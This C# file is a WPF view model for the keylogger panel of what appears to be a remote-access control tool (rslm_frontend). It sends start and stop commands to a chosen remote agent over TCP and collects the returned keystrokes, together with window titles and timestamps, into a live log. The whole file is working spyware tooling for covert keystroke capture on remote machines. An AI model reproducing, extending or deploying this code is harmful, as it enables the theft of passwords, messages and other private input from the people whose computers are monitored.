using System;
using System.Collections.ObjectModel;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using Newtonsoft.Json.Linq;
using rslm_frontend.Services;

namespace rslm_frontend.ViewModels
{
    public class KeyloggerViewModel : ViewModelBase
    {
        private readonly RslmTcpClient _tcpClient;
        private readonly Action<string, string> _log;
        private readonly ObservableCollection<KeylogEntry> _entries = new ObservableCollection<KeylogEntry>();
        private string _logText = "";
        private bool _isCapturing;
        private string _statusText = "Ready";
        private string _targetAgentId;
        private bool _isBusy;

        public KeyloggerViewModel(RslmTcpClient tcpClient, string targetAgentId, Action<string, string> log)
        {
            _tcpClient = tcpClient;
            _targetAgentId = targetAgentId ?? "";
            _log = log;

            StartCommand = new RelayCommand(_ => _ = StartAsync(), _ => !IsCapturing && _tcpClient.IsConnected && !IsBusy);
            StopCommand = new RelayCommand(_ => _ = StopAsync(), _ => IsCapturing);
            ClearCommand = new RelayCommand(_ => Clear());

            _tcpClient.MessageReceived += OnTcpMessage;
        }

        public ObservableCollection<KeylogEntry> Entries => _entries;

        public string LogText
        {
            get => _logText;
            set => SetProperty(ref _logText, value);
        }

        public bool IsCapturing
        {
            get => _isCapturing;
            set
            {
                if (SetProperty(ref _isCapturing, value))
                {
                    ((RelayCommand)StartCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)StopCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public string StatusText
        {
            get => _statusText;
            set => SetProperty(ref _statusText, value);
        }

        public string TargetAgentId
        {
            get => _targetAgentId;
            set => SetProperty(ref _targetAgentId, value);
        }

        public bool IsBusy
        {
            get => _isBusy;
            set
            {
                if (SetProperty(ref _isBusy, value))
                {
                    ((RelayCommand)StartCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public ICommand StartCommand { get; }
        public ICommand StopCommand { get; }
        public ICommand ClearCommand { get; }

        public async Task StartAsync()
        {
            if (string.IsNullOrEmpty(_targetAgentId))
            {
                StatusText = "No agent selected";
                return;
            }

            IsBusy = true;
            StatusText = "Starting keylogger...";

            try
            {
                var response = await _tcpClient.SendMessageAsync("keylog-start", _targetAgentId, new JObject());

                if (response["payload"]?["status"]?.ToString() == "capturing" ||
                    response["type"]?.ToString() == "keylog-start-response")
                {
                    IsCapturing = true;
                    StatusText = "Capturing keystrokes";
                    _log("Keylogger", "Started capturing on " + _targetAgentId);
                }
                else
                {
                    StatusText = "Failed to start: " + (response["payload"]?["error"] ?? response["error"]);
                    _log("Keylogger", "Failed to start: " + StatusText);
                }
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("Keylogger", "Error: " + ex.Message);
            }
            finally
            {
                IsBusy = false;
            }
        }

        public async Task StopAsync()
        {
            if (!string.IsNullOrEmpty(_targetAgentId))
                await _tcpClient.SendMessageAsync("keylog-stop", _targetAgentId, new JObject());

            IsCapturing = false;
            StatusText = "Stopped";
            _log("Keylogger", "Stopped capturing");
        }

        public void Clear()
        {
            LogText = "";
            _entries.Clear();
        }

        private void OnTcpMessage(JObject msg)
        {
            if (msg.Value<string>("type") != "keylog-data") return;

            var payload = msg["payload"];
            if (payload == null) return;

            var text = payload.Value<string>("text");
            var windowTitle = payload.Value<string>("windowTitle");
            var timestamp = payload.Value<long>("timestamp");

            var dispatcher = System.Windows.Threading.Dispatcher.CurrentDispatcher;
            dispatcher.BeginInvoke(new Action(() =>
            {
                var entry = new KeylogEntry
                {
                    Text = text,
                    WindowTitle = windowTitle,
                    Timestamp = timestamp
                };
                _entries.Add(entry);

                var sb = new StringBuilder(LogText);
                if (!string.IsNullOrEmpty(windowTitle))
                    sb.AppendLine($"[{DateTimeOffset.FromUnixTimeMilliseconds(timestamp):HH:mm:ss}] [{windowTitle}]");
                sb.AppendLine(text);
                LogText = sb.ToString();
            }));
        }

        public void Dispose()
        {
            _tcpClient.MessageReceived -= OnTcpMessage;
        }
    }

    public class KeylogEntry : ViewModelBase
    {
        private string _text;
        private string _windowTitle;
        private long _timestamp;

        public string Text
        {
            get => _text;
            set => SetProperty(ref _text, value);
        }

        public string WindowTitle
        {
            get => _windowTitle;
            set => SetProperty(ref _windowTitle, value);
        }

        public long Timestamp
        {
            get => _timestamp;
            set => SetProperty(ref _timestamp, value);
        }
    }
}
